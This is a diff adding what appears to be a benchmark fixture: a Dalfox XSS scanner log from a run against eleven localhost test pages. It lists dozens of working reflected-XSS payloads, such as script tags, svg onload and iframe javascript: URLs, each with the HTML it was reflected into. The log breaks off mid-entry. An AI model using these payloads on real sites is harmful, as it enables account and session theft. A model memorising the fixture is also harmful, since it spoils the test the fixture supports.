@@ -1,0 +1,466 @@
+
+    _..._
+  .' .::::.   __   _   _    ___ _ __ __
+ :  :::::::: |  \ / \ | |  | __/ \\ V /
+ :  :::::::: | o ) o || |_ | _( o )) (
+ '. '::::::' |__/|_n_||___||_| \_//_n_\
+   '-.::''    
+
+🌙🦊 Dalfox is a powerful open-source XSS scanner and utility focused on automation.
+
+ 🎯  Target                 /root/projects/raijin-xss/bench/fixtures/noisy/targets.txt
+ 🏁  Method                 FILE Mode
+ 🖥   Worker                 10
+ 🔦  BAV                    true
+ ⛏   Mining                 false (Gf-Patterns)
+ 🔬  Mining-DOM             false (mining from DOM)
+ ⏱   Timeout                10
+ 📤  FollowRedirect         false
+ 🕰   Started at             2026-10-24 21:00:32.13314474 -0300 -03 m=+0.015986891
+
+ >>>>>>>>>>>>>>>>>>>>>>>>>
+[*] Using file mode(targets list)
+[*] Loaded 11 target urls
+[*] Start Scan 🦊
+[*] 🦊 Start scan [SID:0][0/11][0.00%%] / URL: http://127.0.0.1:19300/item/1?q=shoes&sort=price
+[*] Valid target [ code:200 / size:140 ]
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Found 2 testing point in Dictionary base parameter mining
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Content-Type is text/html; charset=utf-8
+[I] Reflected PATH '/item/dalfoxpathtest' => Injected: /inHTML-none(1)]
+[I] Reflected sort param => PTYPE: URL  Injected: /inHTML-none(1)  (  ]  }  :  \  [  {  .  |  )  `  ;  -  +  $  ,  =
+    4 line:  <p>Sorted by priceDalFo
+[I] Reflected q param => PTYPE: URL  Injected: /inHTML-none(1)  ,  `  [  ;  "  \  >  '  <  =  -  +  $  :  .  (  |  ]  }  {  )
+    3 line:  <p>Results for: shoesDalFo
+[*] Generate XSS payload and optimization.Optimization.. 🛠
+[*] Start XSS Scanning.. with 911 queries 🗡
+[*] [ Make 10 workers ] [ Allocated 911 queries ]
+[V] Triggered XSS Payload (found DOM Object): q="><iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE>
+    3 line:  p>Results for: shoes"><iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE></p>
+[*] [duration: 11.648480907s][issues: 1] Finish Scan!
+[*] Start Scan 🦊
+[*] 🦊 Start scan [SID:1][1/11][9.09%%] / URL: http://127.0.0.1:19300/item/2?q=shoes&sort=price
+[*] Valid target [ code:200 / size:140 ]
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Found 2 testing point in Dictionary base parameter mining
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Content-Type is text/html; charset=utf-8
+[I] Reflected PATH '/item/dalfoxpathtest' => Injected: /inHTML-none(1)]
+[I] Reflected q param => PTYPE: URL  Injected: /inHTML-none(1)  \  >  {  -  [  <  $  :  }  ]  .  +  =  ,  `  ;  "  '  |  )  (
+    3 line:  <p>Results for: shoesDalFo
+[I] Reflected sort param => PTYPE: URL  Injected: /inHTML-none(1)  \  }  (  |  )  ;  {  `  =  $  -  ]  +  ,  [  :  .
+    4 line:  <p>Sorted by priceDalFo
+[*] Generate XSS payload and optimization.Optimization.. 🛠
+[*] Start XSS Scanning.. with 911 queries 🗡
+[*] [ Make 10 workers ] [ Allocated 911 queries ]
+[W] Reflected Payload in HTML: q=<audio controls ondurationchange=v(1)><source src=1.mp3 type=audio/mpeg></audio>
+    3 line:  p>Results for: shoes<audio controls ondurationchange=v(1)><source src=1.mp3 type
+[V] Triggered XSS Payload (found DOM Object): q=<ScRipt class=dalfox>prompt(1)</script>
+    3 line:  <p>Results for: shoes<ScRipt class=dalfox>prompt(1)</script></p>
+[*] [duration: 10.616567819s][issues: 2] Finish Scan!
+[*] Start Scan 🦊
+[*] 🦊 Start scan [SID:2][2/11][18.18%%] / URL: http://127.0.0.1:19300/item/3?q=shoes&sort=price
+[*] Valid target [ code:200 / size:140 ]
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Found 2 testing point in Dictionary base parameter mining
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Content-Type is text/html; charset=utf-8
+[I] Reflected PATH '/item/dalfoxpathtest' => Injected: /inHTML-none(1)]
+[I] Reflected sort param => PTYPE: URL  Injected: /inHTML-none(1)  \  }  -  $  =  `  |  (  ,  ;  .  +  ]  {  :  [  )
+    4 line:  <p>Sorted by priceDalFo
+[I] Reflected q param => PTYPE: URL  Injected: /inHTML-none(1)  >  "  \  <  =  $  +  -  '  ,  .  :  ]  {  ;  (  `  |  )  }  [
+    3 line:  <p>Results for: shoesDalFo
+[*] Generate XSS payload and optimization.Optimization.. 🛠
+[*] Start XSS Scanning.. with 911 queries 🗡
+[*] [ Make 10 workers ] [ Allocated 911 queries ]
+[V] Triggered XSS Payload (found DOM Object): q="><img/src/onerror=.1|alert`` class=dalfox>
+    3 line:  <p>Results for: shoes"><img/src/onerror=.1|alert`` class=dalfox></p>
+[*] [duration: 9.586477079s][issues: 1] Finish Scan!
+[*] Start Scan 🦊
+[*] 🦊 Start scan [SID:3][3/11][27.27%%] / URL: http://127.0.0.1:19300/item/4?q=shoes&sort=price
+[*] Valid target [ code:200 / size:140 ]
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Found 2 testing point in Dictionary base parameter mining
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Content-Type is text/html; charset=utf-8
+[I] Reflected PATH '/item/dalfoxpathtest' => Injected: /inHTML-none(1)]
+[I] Reflected q param => PTYPE: URL  Injected: /inHTML-none(1)  |  {  '  "  (  }  ,  ;  `  \  -  )  <  >  =  $  +  :  .  ]  [
+    3 line:  <p>Results for: shoesDalFo
+[I] Reflected sort param => PTYPE: URL  Injected: /inHTML-none(1)  \  ;  `  ,  |  .  =  +  -  $  [  {  }  ]  (  )  :
+    4 line:  <p>Sorted by priceDalFo
+[*] Generate XSS payload and optimization.Optimization.. 🛠
+[*] Start XSS Scanning.. with 911 queries 🗡
+[*] [ Make 10 workers ] [ Allocated 911 queries ]
+[W] Reflected Payload in HTML: q="><d3"<"/onclick=" class=dalfox>[confirm``]"<">z
+    3 line:  <p>Results for: shoes"><d3"<"/onclick=" class=dalfox>[confirm``]"<">z</p>
+[V] Triggered XSS Payload (found DOM Object): q='><svg/class='dalfox'onLoad=alert(1)>
+    3 line:  <p>Results for: shoes'><svg/class='dalfox'onLoad=alert(1)></p>
+[*] [duration: 10.814017409s][issues: 2] Finish Scan!
+[*] Start Scan 🦊
+[*] 🦊 Start scan [SID:4][4/11][36.36%%] / URL: http://127.0.0.1:19300/item/5?q=shoes&sort=price
+[*] Valid target [ code:200 / size:140 ]
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Found 2 testing point in Dictionary base parameter mining
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Content-Type is text/html; charset=utf-8
+[I] Reflected PATH '/item/dalfoxpathtest' => Injected: /inHTML-none(1)]
+[I] Reflected q param => PTYPE: URL  Injected: /inHTML-none(1)  >  ]  '  `  "  ,  <  ;  \  =  -  :  }  [  +  $  |  .  )  {  (
+    3 line:  <p>Results for: shoesDalFo
+[I] Reflected sort param => PTYPE: URL  Injected: /inHTML-none(1)  {  \  $  :  +  =  ,  -  `  )  ;  (  ]  |  .  [  }
+    4 line:  <p>Sorted by priceDalFo
+[*] Generate XSS payload and optimization.Optimization.. 🛠
+[*] Start XSS Scanning.. with 911 queries 🗡
+[*] [ Make 10 workers ] [ Allocated 911 queries ]
+[V] Triggered XSS Payload (found DOM Object): q=<audio controls ondurationchange=print(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+    3 line:  p>Results for: shoes<audio controls ondurationchange=print(1) id=dalfox><source 
+[*] [duration: 7.952322839s][issues: 1] Finish Scan!
+[*] Start Scan 🦊
+[*] 🦊 Start scan [SID:5][5/11][45.45%%] / URL: http://127.0.0.1:19300/item/6?q=shoes&sort=price
+[*] Valid target [ code:200 / size:140 ]
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Found 2 testing point in Dictionary base parameter mining
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Content-Type is text/html; charset=utf-8
+[I] Reflected PATH '/item/dalfoxpathtest' => Injected: /inHTML-none(1)]
+[I] Reflected q param => PTYPE: URL  Injected: /inHTML-none(1)  \  >  <  `  {  '  $  +  }  =  [  ]  "  ,  :  -  )  .  ;  (  |
+    3 line:  <p>Results for: shoesDalFo
+[I] Reflected sort param => PTYPE: URL  Injected: /inHTML-none(1)  }  \  `  -  =  +  $  ,  ]  )  :  .  |  (  {  [  ;
+    4 line:  <p>Sorted by priceDalFo
+[*] Generate XSS payload and optimization.Optimization.. 🛠
+[*] Start XSS Scanning.. with 911 queries 🗡
+[*] [ Make 10 workers ] [ Allocated 911 queries ]
+[W] Reflected Payload in HTML: q="><d3"<"/onclick=">[confirm``]"<">z
+    3 line:  <p>Results for: shoes"><d3"<"/onclick=">[confirm``]"<">z</p>
+[W] Reflected Payload in HTML: q="><d3"<"/onclick=" class=dalfox>[confirm``]"<">z
+    3 line:  <p>Results for: shoes"><d3"<"/onclick=" class=dalfox>[confirm``]"<">z</p>
+[V] Triggered XSS Payload (found DOM Object): q=<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=alert(1)></menu></div>
+    3 line:  p>Results for: shoes<div contextmenu=xss><p>1<menu type=context class=dalfox id=
+[*] [duration: 7.170777424s][issues: 3] Finish Scan!
+[*] Start Scan 🦊
+[*] 🦊 Start scan [SID:6][6/11][54.55%%] / URL: http://127.0.0.1:19300/item/7?q=shoes&sort=price
+[*] Valid target [ code:200 / size:140 ]
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Found 2 testing point in Dictionary base parameter mining
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Content-Type is text/html; charset=utf-8
+[I] Reflected PATH '/item/dalfoxpathtest' => Injected: /inHTML-none(1)]
+[I] Reflected q param => PTYPE: URL  Injected: /inHTML-none(1)  :  $  =  -  +  ]  [  }  ,  .  \  >  <  '  "  (  `  |  ;  {  )
+    3 line:  <p>Results for: shoesDalFo
+[I] Reflected sort param => PTYPE: URL  Injected: /inHTML-none(1)  `  .  [  ;  {  \  $  =  +  -  )  :  }  ]  |  (  ,
+    4 line:  <p>Sorted by priceDalFo
+[*] Generate XSS payload and optimization.Optimization.. 🛠
+[*] Start XSS Scanning.. with 911 queries 🗡
+[*] [ Make 10 workers ] [ Allocated 911 queries ]
+[W] Reflected Payload in HTML: q=<sVg/onload=print(1)>
+    3 line:  <p>Results for: shoes<sVg/onload=print(1)></p>
+[W] Reflected Payload in HTML: q='><a href='javascript&colon;alert(1)'>click
+    3 line:  <p>Results for: shoes'><a href='javascript&colon;alert(1)'>click</p>
+[W] Reflected Payload in HTML: q="><a href=javas&#99;ript:alert(1)/class=dalfox>click
+    3 line:  <p>Results for: shoes"><a href=javas&#99;ript:alert(1)/class=dalfox>click</p>
+[V] Triggered XSS Payload (found DOM Object): q=<sVg/onload=alert.bind()(1) class=dalfox>
+    3 line:  <p>Results for: shoes<sVg/onload=alert.bind()(1) class=dalfox></p>
+[*] [duration: 6.446010118s][issues: 4] Finish Scan!
+[*] Start Scan 🦊
+[*] 🦊 Start scan [SID:7][7/11][63.64%%] / URL: http://127.0.0.1:19300/item/8?q=shoes&sort=price
+[*] Valid target [ code:200 / size:140 ]
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Found 2 testing point in Dictionary base parameter mining
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Content-Type is text/html; charset=utf-8
+[I] Reflected PATH '/item/dalfoxpathtest' => Injected: /inHTML-none(1)]
+[I] Reflected q param => PTYPE: URL  Injected: /inHTML-none(1)  ]  [  }  <  =  \  $  '  -  "  {  >  ,  +  :  .  `  (  |  )  ;
+    3 line:  <p>Results for: shoesDalFo
+[I] Reflected sort param => PTYPE: URL  Injected: /inHTML-none(1)  \  |  (  ;  `  =  .  ,  +  -  $  ]  [  :  }  )  {
+    4 line:  <p>Sorted by priceDalFo
+[*] Generate XSS payload and optimization.Optimization.. 🛠
+[*] Start XSS Scanning.. with 911 queries 🗡
+[*] [ Make 10 workers ] [ Allocated 911 queries ]
+[V] Triggered XSS Payload (found DOM Object): q=</script><svg><script/class=dalfox>alert(1)</script>-%26apos;
+    3 line:  p>Results for: shoes</script><svg><script/class=dalfox>alert(1)</script>-%26apos
+[*] [duration: 5.848521595s][issues: 1] Finish Scan!
+[*] Start Scan 🦊
+[*] 🦊 Start scan [SID:8][8/11][72.73%%] / URL: http://127.0.0.1:19300/item/9?q=shoes&sort=price
+[*] Valid target [ code:200 / size:140 ]
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Found 2 testing point in Dictionary base parameter mining
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Content-Type is text/html; charset=utf-8
+[I] Reflected PATH '/item/dalfoxpathtest' => Injected: /inHTML-none(1)]
+[I] Reflected q param => PTYPE: URL  Injected: /inHTML-none(1)  (  }  '  "  `  $  :  +  {  <  \  ]  >  [  .  |  )  ;  ,  =  -
+    3 line:  <p>Results for: shoesDalFo
+[I] Reflected sort param => PTYPE: URL  Injected: /inHTML-none(1)  \  -  .  )  $  =  +  ,  ]  :  }  `  |  (  [  ;  {
+    4 line:  <p>Sorted by priceDalFo
+[*] Generate XSS payload and optimization.Optimization.. 🛠
+[*] Start XSS Scanning.. with 911 queries 🗡
+[*] [ Make 10 workers ] [ Allocated 911 queries ]
+[W] Reflected Payload in HTML: q='><img/src/onerror=.1|alert``>
+    3 line:  <p>Results for: shoes'><img/src/onerror=.1|alert``></p>
+[V] Triggered XSS Payload (found DOM Object): q='><sVg/onload=alert(1) id=dalfox>
+    3 line:  <p>Results for: shoes'><sVg/onload=alert(1) id=dalfox></p>
+[*] [duration: 7.677076177s][issues: 2] Finish Scan!
+[*] Start Scan 🦊
+[*] 🦊 Start scan [SID:9][9/11][81.82%%] / URL: http://127.0.0.1:19300/item/10?q=shoes&sort=price
+[*] Valid target [ code:200 / size:141 ]
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Found 2 testing point in Dictionary base parameter mining
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Content-Type is text/html; charset=utf-8
+[I] Reflected PATH '/item/dalfoxpathtest' => Injected: /inHTML-none(1)]
+[I] Reflected q param => PTYPE: URL  Injected: /inHTML-none(1)  \  >  }  <  "  '  -  .  =  :  +  $  ]  {  [  )  ,  (  |  ;  `
+    3 line:  <p>Results for: shoesDalFo
+[I] Reflected sort param => PTYPE: URL  Injected: /inHTML-none(1)  `  \  ;  $  =  |  -  ,  (  +  .  :  )  {  }  [  ]
+    4 line:  <p>Sorted by priceDalFo
+[*] Generate XSS payload and optimization.Optimization.. 🛠
+[*] Start XSS Scanning.. with 911 queries 🗡
+[*] [ Make 10 workers ] [ Allocated 911 queries ]
+[W] Reflected Payload in HTML: q='"><svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
+    3 line:  p>Results for: shoes'"><svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f<
+[V] Triggered XSS Payload (found DOM Object): q=</script><svg><script/class=dalfox>alert(1)</script>-%26apos;
+    3 line:  p>Results for: shoes</script><svg><script/class=dalfox>alert(1)</script>-%26apos
+[*] [duration: 13.941996708s][issues: 2] Finish Scan!
+[*] Start Scan 🦊
+[*] 🦊 Start scan [SID:10][10/11][90.91%%] / URL: http://127.0.0.1:19300/note?msg=a
+[*] Valid target [ code:200 / size:122 ]
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Found 1 testing point in Dictionary base parameter mining
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[*] [SA: ✓ PA: ✓ BAV: ✓ ] Waiting for analysis 🔍
+[I] Content-Type is text/html; charset=utf-8
+[I] Reflected msg param => PTYPE: URL  Injected: /inHTML-none(1)  \  "  $  -  '  `  <  =  +  >  ,  .  :  [  ;  ]  {  }  )  |  (
+    2 line:  <form><textarea name="msg">aDalFox</textarea></
+[*] Generate XSS payload and optimization.Optimization.. 🛠
+[*] Start XSS Scanning.. with 420 queries 🗡
+[*] [ Make 10 workers ] [ Allocated 420 queries ]
+[W] Reflected Payload in HTML: msg="><svg/OnLoad="`${prompt``}`" class=dalfox>
+    2 line:  extarea name="msg">a"><svg/OnLoad="`${prompt``}`" class=dalfox></textarea></form
+[W] Reflected Payload in HTML: msg=<ScRipt>confirm(1)</script>
+    2 line:  <form><textarea name="msg">a<ScRipt>confirm(1)</script></textarea></form>
+[W] Reflected Payload in HTML: msg=<audio controls ondurationchange=prompt(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+    2 line:  extarea name="msg">a<audio controls ondurationchange=prompt(1) id=dalfox><source
+[W] Reflected Payload in HTML: msg=<iframe srcdoc="<input onauxclick=prompt.valueOf()(1)>" class=dalfox></iframe>
+    2 line:  extarea name="msg">a<iframe srcdoc="<input onauxclick=prompt.valueOf()(1)>" clas
+[W] Reflected Payload in HTML: msg=<ScRipt class=dalfox>prompt.valueOf()(1)</script>
+    2 line:  extarea name="msg">a<ScRipt class=dalfox>prompt.valueOf()(1)</script></textarea>
+[W] Reflected Payload in HTML: msg=<audio controls ondurationchange=v(1)><source src=1.mp3 type=audio/mpeg></audio>
+    2 line:  extarea name="msg">a<audio controls ondurationchange=v(1)><source src=1.mp3 type
+[W] Reflected Payload in HTML: msg=<dalfox class=dalfox>
+    2 line:  <form><textarea name="msg">a<dalfox class=dalfox></textarea></form>
+[W] Reflected Payload in HTML: msg="><iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE>
+    2 line:  extarea name="msg">a"><iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE></te
+[W] Reflected Payload in HTML: msg=<sVg/onload=confirm(1)>
+    2 line:  <form><textarea name="msg">a<sVg/onload=confirm(1)></textarea></form>
+[W] Reflected Payload in HTML: msg='><a href='javascript&colon;alert(1)'>click
+    2 line:  extarea name="msg">a'><a href='javascript&colon;alert(1)'>click</textarea></form
+[W] Reflected Payload in HTML: msg=<iFrAme/src=jaVascRipt:alert.bind()(1) class=dalfox></iFramE>
+    2 line:  extarea name="msg">a<iFrAme/src=jaVascRipt:alert.bind()(1) class=dalfox></iFramE
+[W] Reflected Payload in HTML: msg=<iFrAme/src=jaVascRipt:prompt.valueOf()(1)></iFramE>
+    2 line:  extarea name="msg">a<iFrAme/src=jaVascRipt:prompt.valueOf()(1)></iFramE></textar
+[W] Reflected Payload in HTML: msg=<xmp><p title="</xmp><svg/onload=prompt.valueOf()(1)>
+    2 line:  extarea name="msg">a<xmp><p title="</xmp><svg/onload=prompt.valueOf()(1)></texta
+[W] Reflected Payload in HTML: msg=<iframe srcdoc="<input onauxclick=confirm(1)>" class=dalfox></iframe>
+    2 line:  extarea name="msg">a<iframe srcdoc="<input onauxclick=confirm(1)>" class=dalfox>
+[W] Reflected Payload in HTML: msg=<sVg/onload=alert.bind()(1) class=dalfox>
+    2 line:  extarea name="msg">a<sVg/onload=alert.bind()(1) class=dalfox></textarea></form>
+[W] Reflected Payload in HTML: msg="><a href=javas&#99;ript:alert(1)/class=dalfox>click
+    2 line:  extarea name="msg">a"><a href=javas&#99;ript:alert(1)/class=dalfox>click</textar
+[W] Reflected Payload in HTML: msg=<sVg/onload=prompt(1)>
+    2 line:  <form><textarea name="msg">a<sVg/onload=prompt(1)></textarea></form>
+[W] Reflected Payload in HTML: msg=<ScRipt>alert.bind()(1)</script>
+    2 line:  <form><textarea name="msg">a<ScRipt>alert.bind()(1)</script></textarea></form>
+[W] Reflected Payload in HTML: msg=<iFrAme/src=jaVascRipt:confirm(1) class=dalfox></iFramE>
+    2 line:  extarea name="msg">a<iFrAme/src=jaVascRipt:confirm(1) class=dalfox></iFramE></te
+[W] Reflected Payload in HTML: msg=<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=alert(1)></menu></div>
+    2 line:  extarea name="msg">a<div contextmenu=xss><p>1<menu type=context class=dalfox id=
+[W] Reflected Payload in HTML: msg=<xmp><p title="</xmp><svg/onload=prompt(1)>
+    2 line:  extarea name="msg">a<xmp><p title="</xmp><svg/onload=prompt(1)></textarea></form
+[W] Reflected Payload in HTML: msg=<ScRipt>prompt(1)</script>
+    2 line:  <form><textarea name="msg">a<ScRipt>prompt(1)</script></textarea></form>
+[W] Reflected Payload in HTML: msg=<ScRipt>alert(1)</script>
+    2 line:  <form><textarea name="msg">a<ScRipt>alert(1)</script></textarea></form>
+[W] Reflected Payload in HTML: msg='"><svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
+    2 line:  extarea name="msg">a'"><svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f<
+[W] Reflected Payload in HTML: msg="><w="/x="y>"/class=dalfox/ondblclick=`<`[confirm``]>z
+    2 line:  extarea name="msg">a"><w="/x="y>"/class=dalfox/ondblclick=`<`[confirm``]>z</text
+[W] Reflected Payload in HTML: msg='"><img/src/onerror=.1|alert`` class=dalfox>
+    2 line:  extarea name="msg">a'"><img/src/onerror=.1|alert`` class=dalfox></textarea></for
+[W] Reflected Payload in HTML: msg='"><img/src/onerror=.1|alert``>
+    2 line:  <form><textarea name="msg">a'"><img/src/onerror=.1|alert``></textarea></form>
+[W] Reflected Payload in HTML: msg=<iFrAme/src=jaVascRipt:print(1) class=dalfox></iFramE>
+    2 line:  extarea name="msg">a<iFrAme/src=jaVascRipt:print(1) class=dalfox></iFramE></text
+[W] Reflected Payload in HTML: msg='"><iframe srcdoc="<input onauxclick=alert(1)>" class=dalfox></iframe>
+    2 line:  extarea name="msg">a'"><iframe srcdoc="<input onauxclick=alert(1)>" class=dalfox
+[W] Reflected Payload in HTML: msg=</ScriPt><sCripT id=dalfox>alert(1)</sCriPt>
+    2 line:  extarea name="msg">a</ScriPt><sCripT id=dalfox>alert(1)</sCriPt></textarea></for
+[W] Reflected Payload in HTML: msg=<iFrAme/src=jaVascRipt:prompt.valueOf()(1) class=dalfox></iFramE>
+    2 line:  extarea name="msg">a<iFrAme/src=jaVascRipt:prompt.valueOf()(1) class=dalfox></iF
+[W] Reflected Payload in HTML: msg=<ScRipt class=dalfox>prompt(1)</script>
+    2 line:  extarea name="msg">a<ScRipt class=dalfox>prompt(1)</script></textarea></form>
+[W] Reflected Payload in HTML: msg=<sVg/onload=prompt.valueOf()(1) class=dalfox>
+    2 line:  extarea name="msg">a<sVg/onload=prompt.valueOf()(1) class=dalfox></textarea></fo
+[W] Reflected Payload in HTML: msg=</ScriPt><sCripT class=dalfox>alert(1)</sCriPt>
+    2 line:  extarea name="msg">a</ScriPt><sCripT class=dalfox>alert(1)</sCriPt></textarea></
+[W] Reflected Payload in HTML: msg=</script><svg><script/class=dalfox>alert(1)</script>-%26apos;
+    2 line:  extarea name="msg">a</script><svg><script/class=dalfox>alert(1)</script>-%26apos
+[W] Reflected Payload in HTML: msg=<xmp><p title="</xmp><svg/onload=print(1) class=dalfox>
+    2 line:  extarea name="msg">a<xmp><p title="</xmp><svg/onload=print(1) class=dalfox></tex
+[W] Reflected Payload in HTML: msg=<sVg/onload=confirm(1) class=dalfox>
+    2 line:  extarea name="msg">a<sVg/onload=confirm(1) class=dalfox></textarea></form>
+[W] Reflected Payload in HTML: msg=<iFrAme/src=jaVascRipt:confirm(1)></iFramE>
+    2 line:  extarea name="msg">a<iFrAme/src=jaVascRipt:confirm(1)></iFramE></textarea></form
+[W] Reflected Payload in HTML: msg=<ScRipt>prompt.valueOf()(1)</script>
+    2 line:  extarea name="msg">a<ScRipt>prompt.valueOf()(1)</script></textarea></form>
+[W] Reflected Payload in HTML: msg="><script/"<a"/src=data:=".<a,[].some(confirm)>
+    2 line:  extarea name="msg">a"><script/"<a"/src=data:=".<a,[].some(confirm)></textarea></
+[W] Reflected Payload in HTML: msg="><svg/OnLoad="`${prompt``}`">
+    2 line:  <form><textarea name="msg">a"><svg/OnLoad="`${prompt``}`"></textarea></form>
+[W] Reflected Payload in HTML: msg=<iFrAme/src=jaVascRipt:prompt(1) class=dalfox></iFramE>
+    2 line:  extarea name="msg">a<iFrAme/src=jaVascRipt:prompt(1) class=dalfox></iFramE></tex
+[W] Reflected Payload in HTML: msg="><script y="><">/*<script* */prompt()</script
+    2 line:  extarea name="msg">a"><script y="><">/*<script* */prompt()</script</textarea></f
+[W] Reflected Payload in HTML: msg=<div contextmenu=xss><p>1<menu type=context onshow=alert(1)></menu></div>
+    2 line:  extarea name="msg">a<div contextmenu=xss><p>1<menu type=context onshow=alert(1)>
+[W] Reflected Payload in HTML: msg=<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=dalfox>
+    2 line:  extarea name="msg">a<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=dalfox><
+[W] Reflected Payload in HTML: msg=<iframe srcdoc="<input onauxclick=alert.bind()(1)>" class=dalfox></iframe>
+    2 line:  extarea name="msg">a<iframe srcdoc="<input onauxclick=alert.bind()(1)>" class=da
+[W] Reflected Payload in HTML: msg='><img/src/onerror=.1|alert`` class=dalfox>
+    2 line:  extarea name="msg">a'><img/src/onerror=.1|alert`` class=dalfox></textarea></form
+[W] Reflected Payload in HTML: msg=<sVg/onload=print(1) class=dalfox>
+    2 line:  <form><textarea name="msg">a<sVg/onload=print(1) class=dalfox></textarea></form>
+[W] Reflected Payload in HTML: msg=<sVg/onload=print(1)>
+    2 line:  <form><textarea name="msg">a<sVg/onload=print(1)></textarea></form>
+[W] Reflected Payload in HTML: msg=<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=print(1)></menu></div>
+    2 line:  extarea name="msg">a<div contextmenu=xss><p>1<menu type=context class=dalfox id=
+[W] Reflected Payload in HTML: msg=<sVg/onload=prompt.valueOf()(1)>
+    2 line:  <form><textarea name="msg">a<sVg/onload=prompt.valueOf()(1)></textarea></form>
+[W] Reflected Payload in HTML: msg=<xmp><p title="</xmp><svg/onload=alert.bind()(1) class=dalfox>
+    2 line:  extarea name="msg">a<xmp><p title="</xmp><svg/onload=alert.bind()(1) class=dalfo
+[W] Reflected Payload in HTML: msg='>asd
+    2 line:  <form><textarea name="msg">a'>asd</textarea></form>
+[W] Reflected Payload in HTML: msg=<iframe srcdoc="<input onauxclick=print(1)>" class=dalfox></iframe>
+    2 line:  extarea name="msg">a<iframe srcdoc="<input onauxclick=print(1)>" class=dalfox></
+[W] Reflected Payload in HTML: msg="><img/src/onerror=.1|alert``>
+    2 line:  <form><textarea name="msg">a"><img/src/onerror=.1|alert``></textarea></form>
+[W] Reflected Payload in HTML: msg="><svg/class="dalfox"onLoad=alert(1)>
+    2 line:  extarea name="msg">a"><svg/class="dalfox"onLoad=alert(1)></textarea></form>
+[W] Reflected Payload in HTML: msg='><img/src/onerror=.1|alert``>
+    2 line:  <form><textarea name="msg">a'><img/src/onerror=.1|alert``></textarea></form>
+[W] Reflected Payload in HTML: msg=<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=alert.bind()(1)></menu></div>
+    2 line:  extarea name="msg">a<div contextmenu=xss><p>1<menu type=context class=dalfox id=
+[W] Reflected Payload in HTML: msg=<iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE>
